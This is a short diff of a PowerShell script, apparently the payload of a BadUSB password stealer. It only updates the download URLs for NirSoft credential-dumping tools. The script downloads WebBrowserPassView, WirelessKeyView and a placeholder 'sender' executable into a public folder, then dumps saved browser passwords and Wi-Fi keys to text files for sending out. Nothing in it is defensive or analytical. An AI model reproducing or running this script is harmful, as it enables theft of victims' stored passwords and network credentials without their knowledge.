@@ -1,7 +1,7 @@
 Set-Location C:\Users\Public\Documents
-Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
+Invoke-WebRequest "https://github.com/kidarok/Simple_Password_Stealer_BadUSB/blob/main/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
 Invoke-WebRequest "LINK_TO_YOUR_SENDER *.exe" -OutFile sender.exe
-Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
+Invoke-WebRequest "https://github.com/kidarok/Simple_Password_Stealer_BadUSB/blob/main/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
 .\WebBrowserPassView.exe /stext f.txt
 Start-Sleep 3
 .\WirelessKeyView.exe /stext f2.txt
